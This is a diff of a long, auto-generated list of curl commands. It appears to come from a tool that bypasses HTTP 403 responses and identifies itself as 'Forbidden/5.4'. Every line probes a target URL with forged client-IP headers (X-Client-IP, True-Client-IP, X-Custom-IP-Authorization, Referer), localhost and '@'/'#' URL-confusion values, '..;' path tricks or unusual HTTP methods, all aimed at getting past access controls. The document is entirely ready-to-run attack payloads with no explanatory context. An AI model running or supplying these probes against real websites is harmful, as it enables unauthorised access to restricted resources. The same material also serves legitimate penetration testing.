-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7350,7 +7350,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7364,8 +7364,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7387,10 +7387,10 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: 127.0.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'User-Agent: Forbidden/5.4' -X 'VERSION-CONTROL' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'User-Agent: Forbidden/5.4' -X 'UPDATEREDIRECTREF' $1
@@ -7603,16 +7603,16 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'User-Agent: Forbidden
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'User-Agent: Forbidden/5.4' -X 'ARBITRARY' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'User-Agent: Forbidden/5.4' -X 'ACL' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7623,7 +7623,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7637,8 +7637,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7660,22 +7660,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: 127.0
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'True-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7686,7 +7686,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7700,8 +7700,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7723,22 +7723,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: 127.0.0.1 @htt
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Stuff: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Referer: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
